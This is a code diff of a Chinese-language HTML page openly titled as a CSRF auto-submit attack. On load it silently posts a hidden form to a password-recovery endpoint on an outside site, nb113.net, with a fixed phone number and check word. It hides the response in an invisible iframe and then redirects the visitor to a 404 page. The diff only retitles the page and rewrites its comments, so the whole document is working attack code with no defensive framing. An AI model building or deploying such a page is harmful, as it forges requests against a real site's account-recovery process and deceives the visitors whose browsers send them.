@@ -2,28 +2,28 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <title>CSRF 提交并跳转</title>
+  <title>CSRF 自动提交</title>
 </head>
 <body>
 
+  <!-- 自动提交的 POST 表单 -->
   <form id="csrfForm" method="POST" action="https://nb113.net/index.php?s=/ForgetPage/formRemeber" target="hiddenFrame">
     <input type="hidden" name="phone" value="0976261367">
     <input type="hidden" name="checkword" value="12345">
     <input type="hidden" name="btnok" value="">
   </form>
 
-  <!-- 隐藏 iframe，不展示返回内容 -->
+  <!-- 隐藏 iframe，不显示结果页 -->
   <iframe name="hiddenFrame" style="display:none;"></iframe>
 
   <p>正在提交，请稍候…</p>
 
   <script>
-    // 页面加载后自动提交
     window.onload = () => {
-      const form = document.getElementById("csrfForm");
-      form.submit();
+      // 自动提交表单
+      document.getElementById("csrfForm").submit();
 
-      // 设置 5 秒后跳转（不管结果如何）
+      // 5 秒后跳转到 404 页面（无论请求是否成功）
       setTimeout(() => {
         window.location.href = "https://nb113.net/404.html";
       }, 5000);
